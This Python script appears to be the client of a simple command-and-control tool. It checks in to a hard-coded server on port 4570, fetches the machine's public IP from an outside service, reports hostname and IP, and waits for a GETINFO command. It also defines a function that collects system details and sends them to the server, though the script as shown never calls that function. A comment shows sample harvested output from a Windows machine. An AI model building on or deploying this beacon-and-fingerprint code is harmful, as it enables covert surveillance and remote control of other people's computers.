import platform
import socket
from requests import get
import time 
import threading

ip = '127.0.0.1'
port = 4570

def server():
    system_info = platform.uname()
    NodeName = system_info.node
    DeviceIP = get('https://api.ipify.org').content.decode('utf8')
    cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cow.connect((ip, port))
    ping = (f":CLIENTPING\n{NodeName}\n{DeviceIP}")
    print(ping)
    cow.send(ping.encode())
    while True:
        global response
        response = cow.recv(4096).decode()

        if response.startswith(":COMMAND :GETINFO"):
            print("command recived")
            break

def PCinfo():
    system_info = platform.uname()
    node_name = system_info.node
    DeviceIP = get('https://api.ipify.org').content.decode('utf8')

    System = f"System: {system_info.system}"
    Release = f"Release: {system_info.release}"
    Version = f"Version: {system_info.version}"
    Machine = f"Machine: {system_info.machine}"
    Processor = f"Processor: {system_info.processor}"
    CowIP = f"IP: {DeviceIP}"

    cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cow.connect((ip, port))
    PCinfo = ":PCINFO\n" + node_name + "\n" + "\n".join([System, Release, Version, Machine, Processor,CowIP])
    cow.send(PCinfo.encode())
    cow.close()

server()

#Exmple
#:PCINFO
#DESKTOP-K5B43CV
#System: Windows
#Release: 10
#Version: 10.0.19045
#Machine: AMD64
#Processor: Intel64 Family 6 Model 165 Stepping 5, GenuineIntel
#IP: xxx.xx.xxx.xxx